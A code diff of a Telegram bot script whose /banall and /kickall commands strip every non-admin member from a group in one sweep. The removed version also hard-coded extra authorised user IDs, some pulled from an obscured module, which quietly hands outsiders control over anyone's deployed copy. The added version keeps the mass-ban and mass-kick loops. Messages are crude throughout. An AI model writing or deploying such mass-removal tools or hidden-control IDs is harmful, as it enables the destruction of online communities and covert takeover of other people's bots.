@@ -1,170 +1,193 @@
 import logging
 import re
 import os
-import sys, platform
-from asyncio import sleep
-from os import getenv
-from dotenv import load_dotenv
-from telethon import TelegramClient, events, Button
+import sys
+import asyncio
+from telethon import TelegramClient, events
 import telethon.utils
 from telethon.tl import functions
 from telethon.tl.functions.channels import LeaveChannelRequest
 from asyncio import sleep
-from telethon import __version__ as tel
-from material import mc as gg, bsdk as g, startxt2, startxt, hlptxt
 from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins, ChatAdminRights
 from telethon.tl.functions.channels import EditBannedRequest
 from datetime import datetime
-#Logging...
-logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
+from var import Var
+from time import sleep
+from telethon.errors.rpcerrorlist import FloodWaitError
+from telethon.tl import functions
+from telethon.tl.types import (
+    ChannelParticipantsAdmins,
+    ChannelParticipantsKicked,
+    ChatBannedRights,
+    UserStatusEmpty,
+    UserStatusLastMonth,
+    UserStatusLastWeek,
+    UserStatusOffline,
+    UserStatusOnline,
+    UserStatusRecently,
 )
-API_ID = int(getenv("API_ID", ""))
-API_HASH = getenv("API_HASH", "")
-BOT_TOKEN = getenv("BOT_TOKEN", None)
-OWNER_ID = getenv("OWNER_ID", None)
-SEXY = [int(g), int(gg), int(6258877205)]
-#TelegramClient..
-main = TelegramClient(
-    "BanAll",
-    api_id=API_ID,
-    api_hash=API_HASH
-).start(bot_token=BOT_TOKEN)
 
-Owner = "BRANDEDKING82"
-repo = "https://github.com/WCGKING/BRANDED-ALLBAN"
-@main.on(events.NewMessage(pattern="^/start"))
-async def start(event):
-    buttns = [Button.url("Support", "https://t.me/BRANDED_WORLD"), Button.url("Repo", f'{repo}')]
-    py = platform.python_version()
-    if event.sender.id in SEXY:
-        await main.send_file(
-            event.chat.id,
-            file="https://te.legra.ph/file/619ac09e97217459cac3d.jpg",
-            caption=startxt.format(
-                event.sender.first_name,
-                event.sender.id,
-                py,
-                tel,
-                Owner,
-            ),
-            link_preview=False,
-            buttons=buttns
-        )
-    if event.sender.id not in SEXY:
-        await main.send_file(
-            event.chat.id,
-            file="https://te.legra.ph/file/619ac09e97217459cac3d.jpg",
-            caption=startxt2.format(
-                event.sender.first_name,
-                event.sender.id,
-                py,
-                tel,
-                Owner,
-            ),
-            link_preview=False,
-            buttons=buttns
-        )
+RIGHTS = ChatBannedRights(
+    until_date=None,
+    view_messages=True,
+    send_messages=True,
+    send_media=True,
+    send_stickers=True,
+    send_gifs=True,
+    send_games=True,
+    send_inline=True,
+    embed_links=True,
+)
 
 
-@main.on(events.NewMessage(pattern="^/help"))
-async def start(event):
-    buttns = [Button.url("SUPPORT", "https://t.me/BRANDED_WORLD"), Button.url("REPO", f'{repo}')]
-    py = platform.python_version()
-    if event.sender.id in SEXY:
-        await main.send_file(
-            event.chat.id,
-            file="https://te.legra.ph/file/619ac09e97217459cac3d.jpg",
-            caption=hlptxt.format(event.sender.first_name, event.sender.id),
-            link_preview=False,
-            buttons=buttns
-        )
-    if event.sender.id not in SEXY:
-        await event.reply(
-            "This is not for you babe!\n\nMake your own bot from this [Repository](https://github.com/WCGKING/BRANDED-ALLBAN)",
-            link_preview=False,
-        )       
+logging.basicConfig(level=logging.INFO)
 
-@main.on(events.NewMessage(pattern="^/ping"))
-async def ping(event):
-    if event.sender.id in SEXY:
+print("Starting.....")
+
+Riz = TelegramClient('Riz', Var.API_ID, Var.API_HASH).start(bot_token=Var.BOT_TOKEN)
+
+
+SUDO_USERS = []
+for x in Var.SUDO: 
+    SUDO_USERS.append(x)
+
+@Riz.on(events.NewMessage(pattern="^/ping"))  
+async def ping(e):
+    if e.sender_id in SUDO_USERS:
         start = datetime.now()
-        t = "Pinging..."
-        txxt = await event.reply(t)
+        text = "Pong!"
+        event = await e.reply(text, parse_mode=None, link_preview=None )
         end = datetime.now()
         ms = (end-start).microseconds / 1000
-        await txxt.edit(f"I am Alive!!\n\nPing Pong🏓\n`{ms} ms`")
+        await event.edit(f"**I'm On** \n\n __Pong__ !! `{ms}` ms")
 
 
-@main.on(events.NewMessage(pattern="^/banall"))
-async def bun(event):
-  if event.sender.id in SEXY:
-   if not event.is_group:
-        Rep = f"Use This Command In Any Group!!"
-        await event.reply(Rep)
-   else:
-       await event.delete()
-       cht = await event.get_chat()
-       boss = await event.client.get_me()
-       admin = cht.admin_rights
-       creator = cht.creator
-       if not admin and not creator:
-           await event.reply("__I Don't Have Sufficient Rights To Do This.__")
-           return
-       hmm =  await event.reply("__STARTED FUCKING...__")
-       await sleep(18)
-       await hmm.delete()
-       everyone = await event.client.get_participants(event.chat_id)
-       for user in everyone:
-           if user.id == boss.id:
-               pass
-           try:
-               await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None,view_messages=True)))
-           except Exception as e:
-               await event.edit(str(e))
-           await sleep(0.3)
+@Riz.on(events.NewMessage(pattern="^/kickall"))
+async def kickall(event):
+   if event.sender_id in SUDO_USERS:
+     if not event.is_group:
+         Reply = f"Noob !! Use This Cmd in Group."
+         await event.reply(Reply)
+     else:
+         await event.delete()
+         RiZ = await event.get_chat()
+         RiZoeLop = await event.client.get_me()
+         admin = RiZ.admin_rights
+         creator = RiZ.creator
+         if not admin and not creator:
+              return await event.reply("I Don't have sufficient Rights !!")
+         RiZoeL = await Riz.send_message(event.chat_id, "**Hello !! I'm Alive**")
+         admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
+         admins_id = [i.id for i in admins]
+         all = 0
+         kimk = 0
+         async for user in event.client.iter_participants(event.chat_id):
+             all += 1
+             try:
+                if user.id not in admins_id:
+                    await event.client.kick_participant(event.chat_id, user.id)
+                    kimk += 1
+                    await asyncio.sleep(0.1)
+             except Exception as e:
+                    print(str(e))
+                    await asyncio.sleep(0.1)
+         await RiZoeL.edit(f"**Users Kicked Successfully ! \n\n Kicked:** `{kimk}` \n **Total:** `{all}`")
+    
+
+@Riz.on(events.NewMessage(pattern="^/banall"))
+async def banall(event):
+   if event.sender_id in SUDO_USERS:
+     if not event.is_group:
+         Reply = f"Noob !! Use This Cmd in Group."
+         await event.reply(Reply)
+     else:
+         await event.delete()
+         RiZ = await event.get_chat()
+         RiZoeLop = await event.client.get_me()
+         admin = RiZ.admin_rights
+         creator = RiZ.creator
+         if not admin and not creator:
+              return await event.reply("I Don't have sufficient Rights !!")
+         RiZoeL = await Riz.send_message(event.chat_id, "**𝐇𝐈 𝐁𝐀𝐁𝐘 !! 𝐈.𝐦 𝐀𝐥𝐢𝐯𝐞😏**")
+         admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
+         admins_id = [i.id for i in admins]
+         all = 0
+         bann = 0
+         async for user in event.client.iter_participants(event.chat_id):
+             all += 1
+             try:
+               if user.id not in admins_id:
+                    await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
+                    bann += 1
+                    await asyncio.sleep(0.1)
+             except Exception as e:
+                   print(str(e))
+                   await asyncio.sleep(0.1)
+         await RiZoeL.edit(f"**Users Banned Successfully ! \n\n Banned Users:** `{bann}` \n **Total Users:** `{all}`")
+
+    
+@Riz.on(events.NewMessage(pattern="^/unbanall"))
+async def unban(event):
+   if event.sender_id in SUDO_USERS:
+     if not event.is_group:
+         Reply = f"Noob !! Use This Cmd in Group."
+         await event.reply(Reply)
+     else:
+         msg = await event.reply("Searching Participant Lists.")
+         p = 0
+         async for i in event.client.iter_participants(event.chat_id, filter=ChannelParticipantsKicked, aggressive=True):
+              rights = ChatBannedRights(until_date=0, view_messages=False)
+              try:
+                await event.client(functions.channels.EditBannedRequest(event.chat_id, i, rights))
+              except FloodWaitError as ex:
+                 print(f"sleeping for {ex.seconds} seconds")
+                 sleep(ex.seconds)
+              except Exception as ex:
+                 await msg.edit(str(ex))
+              else:
+                  p += 1
+         await msg.edit("{}: {} unbanned".format(event.chat_id, p))
 
 
-@main.on(events.NewMessage(pattern="^/restart"))
-async def restart(jnl):
-    if jnl.sender.id in SEXY:
-        tct = "__Wait Restarting...__"
-        await jnl.reply(tct)
+@Riz.on(events.NewMessage(pattern="^/leave"))
+async def _(e):
+    if e.sender_id in SUDO_USERS:
+        rizoel = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
+        if len(e.text) > 7:
+            bc = rizoel[0]
+            bc = int(bc)
+            text = "Leaving....."
+            event = await e.reply(text, parse_mode=None, link_preview=None )
+            try:
+                await event.client(LeaveChannelRequest(bc))
+                await event.edit("Succesfully Left")
+            except Exception as e:
+                await event.edit(str(e))   
+        else:
+            bc = e.chat_id
+            text = "Leaving....."
+            event = await e.reply(text, parse_mode=None, link_preview=None )
+            try:
+                await event.client(LeaveChannelRequest(bc))
+                await event.edit("Succesfully Left")
+            except Exception as e:
+                await event.edit(str(e))   
+          
+
+@Riz.on(events.NewMessage(pattern="^/restart"))
+async def restart(e):
+    if e.sender_id in SUDO_USERS:
+        text = "__Restarting__ !!!"
+        await e.reply(text, parse_mode=None, link_preview=None )
         try:
-            await main.disconnect()
+            await Riz.disconnect()
         except Exception:
             pass
         os.execl(sys.executable, sys.executable, *sys.argv)
         quit()
 
 
-@main.on(events.NewMessage(pattern="^/leave"))
-async def leave(z):
-    if z.sender.id in SEXY:
-        mkc = ("".join(z.text.split(maxsplit=1)[1:])).split(" ", 1)
-        if len(z.text) > 7:
-            mkb = int(mkc[0])
-            tet = "__Wait Leaving...__"
-            hm = await z.reply(tet)
-            try:
-                await z.client(LeaveChannelRequest(mkb))
-                await hm.edit("**Succesfully Lefted!!**")
-            except Exception as e:
-                await hm.edit(material(e))
-        else:
-            mkb = z.chat_id
-            txt = "__LEAVING...__"
-            ok = await z.reply(txt)
-            try:
-                await z.client(LeaveChannelRequest(mkb))
-                await ok.edit("**Succesfully Lefted!!**")
-            except Exception as e:
-                await z.edit(material(e))
+print("\n\n")
+print("𝗕𝗥𝗔𝗡𝗗𝗘𝗗 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 𝗔𝗟𝗟 𝗕𝗔𝗡 𝗕𝗢𝗧 𝗗𝗢𝗡")
 
-
-print("Your Bot  Deployed Successfully ✅")
-print("Join @BRANDED_WORLD , @BRANDRD_BOT if you facing any kind of issue!!")
-
-
-
-main.run_until_disconnected()
+Riz.run_until_disconnected()
